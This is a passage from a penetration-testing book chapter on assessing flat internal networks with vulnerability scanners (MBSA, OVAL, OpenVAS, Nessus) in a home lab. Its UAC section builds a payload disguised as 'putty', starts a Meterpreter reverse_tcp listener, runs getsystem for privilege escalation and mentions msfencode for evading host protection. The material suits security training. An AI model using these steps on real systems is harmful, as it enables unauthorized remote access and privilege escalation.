- en: Chapter 10. Testing Flat and Internal Networks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter, you will learn the techniques of assessing the network when
    it is flat, that is, there is nothing between us and the target. This makes our
    task much easier; furthermore, the inside of the network is usually the place
    that has the most trusted location, and as such, it offers the least resistance,
    especially when it comes to layer two and the assignment of the physical **Media
    Access Control (MAC)** addresses. In this chapter, we will discuss the following
    topics:'
  prefs: []
  type: TYPE_NORMAL
- en: The role of Vulnerability Scanners
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Dealing with host protection
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: This chapter will provide us with details on how, when we are performing internal
    or white-box testing, we do not have the same challenges that we have when we
    are trying to conduct an external or black-box test. This does not mean that when
    the network is flat and we are inside it, we do not have challenges; there are
    a number of challenges that we may encounter. Furthermore, we have to be prepared
    for protection such as Host Based Intrusion Prevention, antivirus, host firewalls,
    and **Enhanced Mitigation Experience Toolkit** (**EMET**) that the administrator
    might have deployed.
  prefs: []
  type: TYPE_NORMAL
- en: When we are testing the network from the inside, the goal is to emulate a number
    of different threat vectors. Moreover, we want to access the network as an unauthenticated
    user, a user with normal privileges, and a user with escalated privileges; this
    works well with our tools that we use inside the network.
  prefs: []
  type: TYPE_NORMAL
- en: The role of Vulnerability Scanners
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'So, where do Vulnerability Scanners play a part in this? Well, this is where
    they excel: when you provide the scanner with credentials, then the scanner can
    log in to the machine and check the client-side software. This is something that
    we cannot do for the most part in an external test environment.'
  prefs: []
  type: TYPE_NORMAL
- en: Before we get into the different scanners that are available within the Kali
    Linux distributions, we will look at two free tools that we can use for our vulnerability
    assessment for the internal networks.
  prefs: []
  type: TYPE_NORMAL
- en: Microsoft Baseline Security Analyzer
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'The first tool we want to look at is from Microsoft, and it is the **Microsoft
    Baseline Security Analyzer** (**MBSA**). You can download the tool from the following
    link: [http://www.microsoft.com/en-us/download/details.aspx?id=7558](http://www.microsoft.com/en-us/download/details.aspx?id=7558)'
  prefs: []
  type: TYPE_NORMAL
- en: One good thing about the MBSA tool is that it is from Microsoft and it has a
    pretty good idea on what is missing. It also does a good job of identifying the
    missing patches and can identify the security configuration mistakes.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once you have downloaded the tool and installed it, open it and start the program.
    An example of the opening screen configuration is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_2.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing the tool in the running state (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'The first thing we want to do with a tool is scan a computer. To do this, click
    on **Scan a computer** to start the configuration process and bring up the scan
    data entry screen. As you can see, we have quite a number of ways to scan and
    a number of optional settings we can select. An example of this is shown in the
    following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_3.jpg)'
  prefs: []
  type: TYPE_IMG
- en: For this example, you can scan any machine you like. We are going to scan the
    localhost machine on which we are writing this book. When you have selected your
    target, click on **Start Scan** to start the scan. Consequently, you will see
    the tool connect to Microsoft and download the latest patch information. You can
    configure this to grab the information from a local server as well in case an
    Internet connection is not something you have readily available on your network.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the completed scan is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Microsoft Baseline Security Analyzer](img/4771-10-04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we do have some concerns on this machine
    that we scanned. A nice feature of the tool is that we can click on **How to correct
    this link** and get additional information on the finding. An example of the additional
    information can be found in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Microsoft Baseline Security Analyzer](img/477-1_10_5.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The MBSA tool is a good representation of what Vulnerability Scanners excel
    at. This is to be used by the owners of the network as it helps them with their
    vulnerability management program. With internal testing, we can also use Vulnerability
    Scanners to show the client whether their patch-management strategy is working.
    The next tool we want to look at comes from the group at **Mitre**, and it is
    the **Open Vulnerability Assessment Language** (**OVAL**) tool.
  prefs: []
  type: TYPE_NORMAL
- en: Open Vulnerability Assessment Language
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'The OVAL tool differs from the MBSA tool because it looks not only at the Microsoft
    software but also at others. The one thing that is important to note is that this
    tool is not an enterprise type of tool, but for our internal testing purposes,
    we can use it to provide us with a look at the software that is installed on the
    machine and see whether there are any vulnerabilities there. A description of
    OVAL from their website is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_6.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, this tool is international and provides a
    method to evaluate the state of computer systems. We will take a look at the tool.
    To do this, we will look at the OVAL Interpreter, which provides a method of demonstrating
    the tool and its definitions; you can download it from [http://sourceforge.net/projects/ovaldi/](http://sourceforge.net/projects/ovaldi/).
    Once the tool downloads, run the tool and install it. For the purpose of the book,
    we are installing it on a virtual machine that has Windows 7 running on it. Feel
    free to install it on the machine of your choice. Once you have downloaded the
    tool, when you run the executable file, which is an SFX archive, and upon execution
    all the files will be unzipped to a directory on the hard drive. By default, it
    will select the `Program Files` directory; however, it is recommended that you
    change the location to the one that does not have spaces in the directory's name.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once you have unzipped the files, you can read the `README.txt` file and you
    will discover that the next thing you have to do is to download the latest definitions
    file. An example of information on these definitions files that includes their
    types is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_7.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Once you have reviewed the information on the definitions, we would want to
    use the vulnerability definitions. You can download their latest version from
    [http://oval.mitre.org/rep-data/index.html](http://oval.mitre.org/rep-data/index.html).
    At the time of writing this book, the latest version of OVAL is 5.10, which is
    the version we will be working with. Your version may be different, and as such,
    some of the screenshots might vary from those in the book.
  prefs: []
  type: TYPE_NORMAL
- en: You will notice that the definitions are by platform; this makes it easier for
    us to only concentrate on the specific platform we are using when we run the interpreter.
    As we are using Windows 7 for the book, we will only download that. You also see
    that there is a hash value to help maintain the integrity of the definitions.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Once you have downloaded the definitions, you would want to place it in the
    OVAL directory and rename it to `definitions.xml`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once you have renamed the file, you are ready to run the interpreter tool;
    enter the following in a command prompt window:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: If you get an application initialization error, then you have to download the
    correct Visual C++ platform for your version of OS and possibly, the .NET 4.0
    package. This is one of the downfalls of using Windows, especially when it comes
    to the open source tools. Of course, you can run into the same problems with UNIX
    and Linux with library dependencies and other challenges. Refer to the `README`
    file for more information. The command uses the hash as a validation that the
    definitions file is not corrupt.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the initial results when the command is run is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_8.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the characteristics file is created, you will see the tool report stating
    that it is running the OVAL definition analysis on the date that was collected.
    This process will take some time to complete and is dependent on the amount of
    software and other things on the machine it is run on. An example of when the
    tool gets to this stage is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_9.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'When the analysis is completed, the output will be written to the file that
    was specified on the command line. In our example here, we are writing the output
    to the `test.html` file. An example of the information on the system is shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The previous screenshot shows us not only the information about the machine,
    but also the OVAL tool itself. It provides us with the schema version and the
    product version as well. Below this area is the report on the findings of the
    tool. This is where the vulnerabilities will be listed, including the references
    to external information to learn more about the finding. An example of this is
    shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing the vulnerabilities listed, including the references to external
    information (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'As you can see in the previous screenshot, there is a reference to both the
    OVAL ID and the **Common Vulnerability** and **Exposure** (**CVE**) number. To
    gather more information, you can click on the link provided. An example of the
    information at the OVAL ID site is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Open Vulnerability Assessment Language](img/477-1_10_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The OVAL tool is the one you might want to become more familiar with. When you
    are doing internal testing, it can be a valuable asset to help you find vulnerabilities
    that a vulnerability scanner might not find. We will now look at the vulnerability
    scanners that are normally used from a remote location with respect to the target.
    We had this with the MBSA tool as well, but it required privileged access to perform
    the scan. Additionally, the OVAL tool also required privileged access.
  prefs: []
  type: TYPE_NORMAL
- en: Scanning without credentials
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'When we use a vulnerability scanner in our internal testing, the first scan
    will be without credentials, so we will look at the tools within Kali Linux to
    achieve this. The Vulnerability Scanners in Kali Linux are found by navigating
    to **Applications** | **Kali Linux** | **Vulnerability Analysis** location. Within
    this location, there are a number of tools we can use for our vulnerability scanning.
    An example is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning without credentials](img/477-1_10_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The scanner we will work with is the OpenVAS scanner. When you start working
    with OpenVAS for the first time, there are a number of steps required. The first
    step is to navigate to **Applications** | **Kali Linux** | **Vulnerability Analysis**
    | **OpenVAS** | **Initial Setup**. This will download all the plugins required
    and will take some time to complete. Once the tool is loaded, you will be asked
    for a password; the default user is `admin`, and you can enter a password of your
    choice.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next thing you need to do is open a browser and connect to the interface
    of the tool. In the browser, enter `https://127.0.0.1:9392` to open OpenVAS. An
    example is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning without credentials](img/477-1_10_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The screen you get after entering https://127.0.0.1:9392 in the browser (the
    cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'Log in to the interface with the username as `admin` and the password you created
    during the initial setup. This will bring you to the scan configuration page,
    which in Kali, includes a `Quick start` area, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning without credentials](img/477-1_10_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Prior to scanning, we have some additional steps to perform. The first step
    is to update the **Network Vulnerability Tests** (**NVT**) feed. Navigate to **Administration**
    | **NVT Feed** | **Synchronize feed now**; once the synchronization finishes,
    you need to update the **Security Content Automation Protocol** (**SCAP**) feed.
    We can do this by navigating to **Administration** | **SCAP Feed** | **Synchronize
    with SCAP** and then updating the CERT feed by navigating to **Administration**
    | **NVT Feed** | **Synchronize CERT feed now**.
  prefs: []
  type: TYPE_NORMAL
- en: For our first scan, we will scan the Windows XP machine as it should provide
    us with a number of findings. As you see in the explanation in the **Quick start**
    section, the shortcut saves us the trouble of creating the target and a new task
    for the scan. For some of you reading this, you might have run OpenVAS on the
    **BackTrack** distribution and will remember how cumbersome it could be doing
    a scan there.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: If you have problems with the OpenVAS, it is sometimes easier to just perform
    the process in BackTrack. For some reason, when you update the Kali Linux distribution,
    there are times when it breaks OpenVAS. There are some very good tutorials on
    the Internet to use the tool. A favorite one for using it on BackTrack can be
    found at [http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html](http://www.ehacking.net/2011/06/backtrack-5-openvas-tutorial.html).
    Even though it is a bit outdated, it works very well.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once we have scanned the XP machine, we are presented with a report of the
    findings. An example of the report for the XP machine is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning without credentials](img/477-1_10_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Nessus
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The next tool we will use is Vulnerability Scanner **Nessus** from Tenable.
    You can download the tool from [http://www.tenable.com/products/nessus/select-your-operating-system](http://www.tenable.com/products/nessus/select-your-operating-system).
  prefs: []
  type: TYPE_NORMAL
- en: Once you have downloaded the tool, you need to register for a home registration
    feed and then install the software. In this book, we are going to use the Windows
    version of the tool. This is because the web interface uses flash, and this can
    sometimes cause problems in the Kali Linux distribution, so it is often easier
    to use the Windows tool. You are welcome to use the one in Kali; just search on
    the Internet for a tutorial and it will walk you through the process.
  prefs: []
  type: TYPE_NORMAL
- en: 'At the time of writing of this book, the latest version of Nessus is 5.2.5,
    and this revision includes a number of features and a redesigned interface for
    Nessus. Additionally, they have added the capability of creating remediation reports.
    This is always a nice feature when you are testing, because then you can help
    the client understand what it will take to fix the findings that you discovered.
    With this version, it is required that you first select a policy before you perform
    a scan. An example of the policy options is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Nessus](img/477-1_10_17.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'For our policy in our example, we will click on **Basic Network Scan** and
    open the configuration form for the policy. We will scan our Windows 7 machine,
    but first, we need to enter a name for the scan. We will enter the name as `FirstScan`.
    You will also notice that you can select a scope. We will leave the default setting
    of private and click on **Next** to move on to the next screen. We have the choice
    of selecting **Internal** or **External** as the scan type. As we are on a flat
    network, we will use the setting of **Internal** and click on **Next**. This will
    bring us to a screen where we can add credentials. As this is a scan without credentials,
    we will not do it now. So, click on **Save** to save the details of the scan.
    An example of our first scan policy is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Nessus](img/477-1_10_18.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We are now ready to start our scan, so navigate to **Scans** | **New Scan**
    to start the configuration process for the scan. Enter a name for the scan and
    then enter the IP address of the target. An example of the scan''s configuration
    is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Nessus](img/477-1_10_19.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once you have verified your information, click on the **Launch** button to
    launch the scan. You will notice that the scan starts, and you should see a **Running**
    message to indicate the scan is in the running state. It will take some time,
    but when the scan completes, you will see it indicated in the status area as **Completed**.
    An example of the scan results is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Nessus](img/477-1_10_20.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Well, this is not very exciting; we have all blue and only three total vulnerabilities.
    So, we need to scan something that will provide us some more weaknesses. We will
    do this now; the next scan will be that of the Windows XP machine. An example
    of the results of this scan is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Nessus](img/477-1_10_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Well, this is a little better, but not much!
  prefs: []
  type: TYPE_NORMAL
- en: Scanning with credentials
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Again, as we have specified, Vulnerability Scanners work best when they are
    provided with credentials. Up to this point, we have not provided any credentials.
    We will do this now. If you return to your scan policy's configuration by navigating
    to **Policies** | **New Policy**, click on **Basic Network Scan** and then on
    **Next**. When you get to the configuration of the credentials page, you need
    to enter an administrator account's username and password. There is also a credentialed
    scan option, but for now, we will conduct the same scan we just did and see what
    happens. Once we have entered the required details, click on **Launch** to launch
    the scan.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the completed scan is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We have some more informational findings but still only the same two medium
    vulnerabilities, so what do we do now? We will try another scan this time, selecting
    the policy that references using credentials. Return to the scan configuration.
    When the option comes up, select the one for the credentialed scan, and let us
    see whether this provides us with more success. Unfortunately, this does not provide
    much success either. The process is to scan from the remote location and note
    the findings, and then if the scope permits, you conduct scans locally using MBSA
    or OVAL.
  prefs: []
  type: TYPE_NORMAL
- en: 'Before we move on, there is one important note here: the scans we have been
    attempting were all against the machine, and at that time, the machine had the
    Windows firewall on. So, this is the challenge with the internal testing; if the
    machines have the firewall on, it can make things more difficult. Let us look
    at one more scan of the Windows 7 machine with credentials and the firewall off.
    If the machine is set on **Public** when it''s connected to the network, then
    file sharing is turned off and nothing will work when we scan it with the tools.
    Therefore, we need to ensure that we can still access the file-sharing ports if
    the firewall is enabled.'
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the Windows 7 scan with the firewall off is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_23.jpg)'
  prefs: []
  type: TYPE_IMG
- en: In this case, we have quite a few vulnerabilities now that we added the credentials
    to the scan policy. This is the power of vulnerability scanners; when they have
    credentials, they are much more effective.
  prefs: []
  type: TYPE_NORMAL
- en: 'We will next look at a scan against a Unix machine with and without credentials,
    so we get a comparison of the different operating systems. We will use FreeBSD
    Unix, and in fact, we will use an old version of it to see what we can discover.
    The version we will use is 6.4, and at the time of writing this book, the version
    is 10.0, so there is quite a difference. An example of the FreeBSD scan without
    credentials is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As we can see from the previous screenshot, there are three low-rated vulnerabilities.
    This is a very old Unix machine, so it is hard to believe that there are only
    three vulnerabilities discovered. However, let us add some credentials and see
    whether we get any better results. With Unix and Linux, the credentials are provided
    via **Secure Shell** (**SSH**). An example of the same scan with SSH credentials
    is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_25.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We now have 28 vulnerabilities, but more importantly, we have a critical finding
    of having an unsupported operating system. We would think that the operating system
    is unsupported as it is a very old version, but still, it is not that many vulnerabilities
    when you think about it.
  prefs: []
  type: TYPE_NORMAL
- en: 'You also might notice that the scan seems to take a long time when you try
    and scan a FreeBSD Unix machine. This is because it is a machine that knows what
    a potential scan looks like and as such, will restrict what it sends back. An
    example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_26.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, the scanning tool is asking for a lot of packets,
    and the FreeBSD machine is limiting it to 200 packets per second, no matter what
    the tool tries. This, along with the fact that most vulnerability scanners put
    their main focus on Windows, is why we do not see a lot of findings with the scan.
  prefs: []
  type: TYPE_NORMAL
- en: 'We will try one more scan as an example to see what the scanner detects when
    it encounters a Linux target. The first scan we are going to do is a scan using
    Nessus on the Kioptrix machine that we created earlier. An example of the Nessus
    network scan of the Kioptrix machine is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Scanning with credentials](img/477-1_10_27.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing an example of the Nessus network scan of the Kioptrix machine
    (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: That's more like it! We can at least detect very vulnerable Linux machines.
    This is why we test on our ranges; we want to know what we can and cannot detect.
    So, based on this section, the FreeBSD Unix machine did not reveal much, but the
    Windows and the Linux machines did. This is good to know when you are testing.
    If you run into a Unix machine, you know that you can save this towards the end
    of the testing once you have completed all of the details of the other machines.
  prefs: []
  type: TYPE_NORMAL
- en: Dealing with host protection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We know there is more than likely going to be host protection that we may have
    to encounter; therefore, in our pen testing labs, we want to test the different
    host protection to see what we can and cannot do. This is an area that again is
    going to depend on the administrator and the team that we are up against. A hardened
    machine with very little services running on it will present a challenge to our
    testing.
  prefs: []
  type: TYPE_NORMAL
- en: User Account Control
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: One of the most common things we are going to encounter is **User Account Control**
    (**UAC**); this is because it is on by default and is rarely changed when a site
    installs Windows. One good thing about UAC is the fact that the users are conditioned
    to click. So, if something pops up saying it needs permission, the user more than
    likely will click on it. We can use this to our advantage, but there always is
    a chance that the user might not click. So, for these situations, we rely on some
    form of UAC bypass to get us past the UAC protections.
  prefs: []
  type: TYPE_NORMAL
- en: Within the metasploit framework, there is a UAC bypass, and it is a function
    that is located in the Meterpreter shell. For reference on UAC and ways to bypass
    it, refer to [http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html](http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html).
  prefs: []
  type: TYPE_NORMAL
- en: For the most part, to exploit the Windows 7 machine, we will need to get some
    form of a client-side attack. We will discuss these attacks later in the book.
    For now, we will use the simple method of creating an executable and then getting
    it to the victim machine. This, when executed, will provide us with a shell into
    the Windows 7 machine. Once we have the shell, then it is just a matter of working
    through the different processes to attempt to bypass UAC and achieve system level
    privileges on the machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'The first thing we want to do is verify that the UAC settings are enabled on
    the machine. You can find the settings by navigating to **Control Panel** | **Action
    Center** | **Change User Account Control Settings**. This will open the settings
    of UAC. An example is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_37.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We will create an executable file and transfer it to the Windows 7 virtual machine
    to provide us our first shell from the exploited machine. We will use the executable
    file capability of metasploit.
  prefs: []
  type: TYPE_NORMAL
- en: 'We first need to create an executable file to use as our connection from the
    Windows 7 machine back to our Kali Linux machine. We have this capability in the
    metasploit tool. In your Kali Linux machine, open a terminal window and enter
    `msfconsole` to open the metasploit tool. Once the metasploit tool comes up (it
    will take a minute), enter the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: This will create the executable file called `putty`, which contains the payload
    and connection information for the connection to egress out from the network to
    the Kali machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the command being entered and completed is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_38.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing an example of the command being entered and completed (the cropped
    text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: We have now created the file and need to get it from our machine to the victim.
    We could use some form of social engineering; however, for our purposes, in a
    lab environment, we will just drag-and-drop the file into the victim machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next thing we need to do is to set up the metasploit tool; we do this by
    entering the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '`use exploit/multi/handler`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set PAYLOAD windows/meterpreter/reverse_tcp`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set LHOST <Kali IP>`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set LPORT 123`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`exploit`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'This sets the listener and it waits for a victim to connect to it. An example
    of the commands is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_39.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We are now ready for the connection. For this, we would need the user to run
    the executable we have created. We could use an encoder such as `msfencode` to
    try and evade the host-based protections that are in place. However, in a test
    environment, we can only validate the evasion works against our configuration,
    and there is no guarantee that we will get the same configuration in our target
    environment. When the program is run, we should see a connection and session open
    in our Kali window. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_40.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We now have a shell. So here comes the tricky part; we have to try and escalate
    the privileges, but first we need to see what privilege level we are at. Enter
    `getuid` in your shell on the victim machine to display your current privilege
    level. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_41.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we are not the system, so we need to escalate
    privileges and bypass the UAC protection. The first thing to try is to see whether
    the Meterpreter shell can perform privilege escalation for us. We do this by entering
    `getsystem` and letting it try to escalate privileges to the system. An example
    of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![User Account Control](img/477-1_10_42.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing entering getsystem and letting it try to escalate privileges
    to system (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: As the previous screenshot shows, we are not successful, so we need to try another
    way. We will look at this in more detail when we discuss client-side testing.
    So, for now, we will stop here and look at this again later. As always, it is
    a matter of how the machine that we have compromised is configured. There is no
    guarantee that we will be able to bypass the UAC.
  prefs: []
  type: TYPE_NORMAL
- en: The host firewall
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: One of the defenses that is often overlooked is that of the host firewall. Earlier
    in this chapter, we explained that with the firewall on, there was a limitation
    on what we could see when we conducted a vulnerability scan. We will proceed further
    in our testing, so we can see what challenges the host firewall can present and
    then see the methods we can use to get data from the target even when the firewall
    is on.
  prefs: []
  type: TYPE_NORMAL
- en: As you may recall, with our scanning methodology, we look for the live systems,
    followed by the ports, and then the services. From there, we perform enumeration,
    identify vulnerabilities, and then exploitation when it is allowed as per our
    scope of work. Well, what we need to do now is first look at this process with
    the firewall off and then with the firewall on across a sampling of the various
    defined zones. We will use the Kali Linux virtual machine and the Windows 7 machine
    as a target for our testing.
  prefs: []
  type: TYPE_NORMAL
- en: 'In your Windows 7 machine, we need to open the firewall configuration. There
    are a number of ways to do this. For our purpose, here we will right-click on
    the network tray icon and navigate to **Open Network and Sharing Center** | **Windows
    Firewall** to open the firewall configuration options. An example of this is shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_28.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we have the firewall on, but it is on only
    on the **Home or work (private) networks** settings. This is probably not what
    we will encounter in an environment; the **Public networks** settings would more
    than likely be in the on state, but for our testing, this will serve the purpose.
    So, the question is what do the different zones mean with respect to the settings
    for the firewall with the most recent versions of Windows not as much as with
    a Windows Server 2003 for instance?
  prefs: []
  type: TYPE_NORMAL
- en: 'The latest releases of Windows know that if the role of the machine is that
    of a client, then it should not be receiving any connections. So, how do we view
    the connection settings? Open an administrator command prompt in the Windows 7
    machine and enter the following command on the command line:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the command is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_29.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, there is nothing open on the machine. Again,
    this is because it is a client, and by default, Windows does not let anything
    talk to the client. This can be discovered by looking at the recommended settings
    on the Windows machine. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now that we have a better understanding of the firewall rules on Windows, it
    is time to conduct our methodology. Using your Kali Linux machine, scan the Windows
    7 machine. You should perform the steps of the methodology and then look at the
    results with and without the firewall on. An example of the enumeration scan with
    Nmap against the machine without the firewall is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_31.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now that we have a result that shows us quite a bit of information about our
    target, we will turn the firewall on and see whether the Nmap tool or moreover,
    the Nmap scripting engine, detects anything from the firewall-protected target.
    You can use the command line to enable the firewall. In the command prompt window,
    enter `netsh firewall set opmode enable` to enable the firewall. An example of
    the results when we scan against a firewall-protected machine is shown in the
    following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_32.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, the firewall can present challenges for our
    testing. The fact that with Windows 7, by default, there really is nothing allowed
    inbound shows the changes in the philosophy with respect to security. The good
    news is that something will require access, and as such, the administrator will
    turn something on or allow some program access. To view the allowed programs from
    the command line, enter the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'We have looked at the Windows 7 firewall, and this is a representation of a
    client, but what about a server? We will look at a Windows 2003 server for comparison.
    The commands in Windows Server 2003 are the same. If the server is set as a standalone
    one, then you will see similar results to what we discovered earlier. However,
    it would not be common to see the server without some form of services, and the
    most common one is the file-sharing service that many servers allow for the sharing
    of information. An example of Windows Server 2003 that has file sharing enabled
    is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The host firewall](img/477-1_10_33.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We have now looked at the protections that are in place if a site uses the built-in
    firewall of Windows, and as we have discovered, this can and will present challenges
    in testing.
  prefs: []
  type: TYPE_NORMAL
- en: Endpoint protection
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The next type of protection we want to look at is the protection of the endpoint.
    We saw an example of this earlier, so we will only briefly cover the topic here.
    The important thing to remember is all of these protections usually have something
